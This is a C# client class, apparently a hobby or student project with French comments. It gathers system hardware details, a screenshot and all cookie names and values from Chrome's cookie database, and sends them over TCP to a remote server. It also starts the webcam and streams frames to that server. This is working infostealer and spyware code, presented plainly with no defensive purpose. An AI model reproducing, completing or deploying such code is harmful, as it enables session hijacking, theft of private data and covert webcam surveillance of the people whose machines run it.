using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using Microsoft.Data.Sqlite;



namespace Test_Socket
{
    public class ClientCollecte
    {
        private string IPserver;
        private int portText;
        private int portVideo;

        private StreamWriter writer;
        private StreamReader reader;
        private Socket textSocket;
        private Socket videoSocket;
        private VideoCaptureDevice videoSource;

        public ClientCollecte(string IPserver, int portText, int portVideo)
        {
            this.IPserver = IPserver;
            this.portText = portText;
            this.portVideo = portVideo;
            ConnectToServer();
        }

        public void ConnectToServer()
        {
            try
            {
                textSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(IPserver), portText);
                textSocket.Connect(endPoint);

                videoSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint videoEndPoint = new IPEndPoint(IPAddress.Parse(IPserver), portVideo);
                videoSocket.Connect(videoEndPoint);

                NetworkStream stream = new NetworkStream(textSocket);
                writer = new StreamWriter(stream); // Ne pas utiliser using ici
                reader = new StreamReader(stream);

                MessageBox.Show("Client Connected...");

                // Démarrer la capture vidéo une fois la connexion établie
                StartVideoCapture();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Erreur lors de la connexion au serveur : " + ex.Message);
                // Assurez-vous que writer est initialisé à null en cas d'échec de la connexion
                writer = null;
            }
        }

        public void SendData(string os, string mother, string proc, string ram, string disk, byte[] screenshot, string cookies)
        {
            try
            {
                if (writer == null || writer.BaseStream == null || !writer.BaseStream.CanWrite)
                {
                    MessageBox.Show("La connexion au serveur n'est pas établie.");
                    return;
                }

                // Écrire les données texte dans le flux de sortie
                writer.WriteLine(os);
                writer.WriteLine(mother);
                writer.WriteLine(proc);
                writer.WriteLine(ram);
                writer.WriteLine(disk);
                writer.WriteLine(cookies);
                MessageBox.Show("Cookies : " + cookies);
                writer.Flush();
                //MessageBox.Show("Données envoyées au serveur.");

                // Envoyer les captures d'écran au serveur
                if (screenshot != null && screenshot.Length > 0)
                {
                    // Convertir les bytes de l'image en base64 pour l'envoi
                    string screenshotBase64 = Convert.ToBase64String(screenshot);

                    // Envoyer les captures d'écran au serveur
                    writer.WriteLine(screenshotBase64);
                    writer.Flush();
                    //MessageBox.Show("Capture d'écran envoyée au serveur.");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Erreur lors de l'envoi des données : " + ex.Message);
            }
        }

        // Méthode pour obtenir les informations du système d'exploitation
        private string GetOperatingSystemInfo()
        {
            return "OS# " + Environment.OSVersion;
        }

        // Méthode pour obtenir les informations de la carte mère
        private string GetMotherboardInfo()
        {
            string result = "";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
            foreach (ManagementObject mo in searcher.Get())
            {
                result += "Motherboard# ";
                result += "Fabricant : " + mo["Manufacturer"] + ", ";
                result += "Produit : " + mo["Product"] + ", ";
                result += "Numéro de série : " + mo["SerialNumber"] + ", ";
                result += "Version : " + mo["Version"];
            }
            return result;
        }

        // Méthode pour obtenir les informations du processeur
        private string GetProcessorInfo()
        {
            string result = "";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
            foreach (ManagementObject mo in searcher.Get())
            {
                result += "Processor# ";
                result += "Processeur : " + mo["Name"] + ", ";
                result += "Architecture : " + mo["Architecture"] + ", ";
                result += "Fabricant : " + mo["Manufacturer"] + ", ";
                result += "Nombre de cœurs : " + mo["NumberOfCores"] + ", ";
                result += "Nombre de threads : " + mo["NumberOfLogicalProcessors"];
            }
            return result;
        }

        // Méthode pour obtenir les informations de la RAM
        private string GetRAMInfo()
        {
            string result = "";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory");
            foreach (ManagementObject mo in searcher.Get())
            {
                ulong c = Convert.ToUInt64(mo["Capacity"]);
                double cc = Math.Round(c / (1024.0 * 1024.0 * 1024.0), 2);
                result += "RAM# ";
                result += "Mémoire physique : " + cc + " GB, ";
                result += "Fabricant : " + mo["Manufacturer"] + ", ";
                result += "Type : " + mo["MemoryType"] + ", ";
                result += "Vitesse : " + mo["Speed"];
            }
            return result;
        }

        // Méthode pour obtenir les informations du disque
        private string GetDiskInfo()
        {
            string result = "";
            DriveInfo[] d = DriveInfo.GetDrives();
            foreach (DriveInfo drive in d)
            {
                result += "Disk# ";
                result += "Drive : " + drive.Name + ", ";
                result += "Type : " + drive.DriveType + ", ";
                result += "Format : " + drive.DriveFormat + ", ";
                result += "Espace total : " + drive.TotalSize / (1024 * 1024 * 1024) + " GB, ";
                result += "Espace libre : " + drive.TotalFreeSpace / (1024 * 1024 * 1024) + " GB";
            }
            return result;
        }

        // Méthode pour prendre une capture d'écran
        private byte[] TakeScreenshot()
        {
            using (Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            {
                using (Graphics graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                }
                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Jpeg);
                    return ms.ToArray();
                }
            }
        }

        // Méthode pour collecter les cookies
        private string CollectCookies()
        {
            StringBuilder cookiesBuilder = new StringBuilder();

            // Chemin des fichiers de cookies Chrome
            string chromeCookiesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Cookies");
            if (File.Exists(chromeCookiesPath))
            {
                cookiesBuilder.AppendLine("Chrome Cookies:");
                cookiesBuilder.AppendLine(ExtractCookiesFromChrome(chromeCookiesPath));
            }

            // Vous pouvez ajouter ici la collecte des cookies d'autres navigateurs si nécessaire

            return cookiesBuilder.ToString();
        }

        // Méthode pour extraire les cookies de Chrome
        private string ExtractCookiesFromChrome(string chromeCookiesPath)
        {
            StringBuilder chromeCookiesBuilder = new StringBuilder();

            try
            {
                // Ouvrir la base de données SQLite de Chrome
                using (SqliteConnection connection = new SqliteConnection($"Data Source={chromeCookiesPath}; Version=3;"))
                {
                    connection.Open();

                    // Sélectionner les cookies de la table 'cookies' dans la base de données
                    string query = "SELECT name, value FROM cookies";
                    using (SqliteCommand command = new SqliteCommand(query, connection))
                    {
                        using (SqliteDataReader reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string name = reader["name"].ToString();
                                string value = reader["value"].ToString();
                                chromeCookiesBuilder.AppendLine($"{name}: {value}");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Gérer toute exception survenue lors de la lecture des cookies
                chromeCookiesBuilder.AppendLine($"Erreur lors de la lecture des cookies de Chrome : {ex.Message}");
            }

            return chromeCookiesBuilder.ToString();
        }


        // Méthode pour collecter toutes les données et les envoyer au serveur
        public void CollectAndSendData()
        {
            string os = GetOperatingSystemInfo();
            string mother = GetMotherboardInfo();
            string proc = GetProcessorInfo();
            string ram = GetRAMInfo();
            string disk = GetDiskInfo();
            byte[] screenshotBytes = TakeScreenshot();
            string cookies = CollectCookies();
            SendData(os, mother, proc, ram, disk, screenshotBytes, cookies);
        }

        private void StartVideoCapture()
        {
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            if (videoDevices.Count > 0)
            {
                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
                videoSource.Start();
            }
            else
            {
                MessageBox.Show("Aucune caméra détectée.");
            }
        }

        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
            byte[] imageBytes = ImageToByteArray(bitmap);
            SendVideoData(imageBytes);
        }

        private byte[] ImageToByteArray(Bitmap bitmap)
        {
            using (MemoryStream stream = new MemoryStream())
            {
                bitmap.Save(stream, ImageFormat.Jpeg);
                return stream.ToArray();
            }
        }

        private void SendVideoData(byte[] videoData)
        {
            try
            {
                if (videoSocket == null || !videoSocket.Connected)
                {
                    MessageBox.Show("La connexion au serveur n'est pas établie.");
                    return;
                }

                videoSocket.Send(videoData);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Erreur lors de l'envoi de la vidéo : " + ex.Message);
            }
        }
    }
}
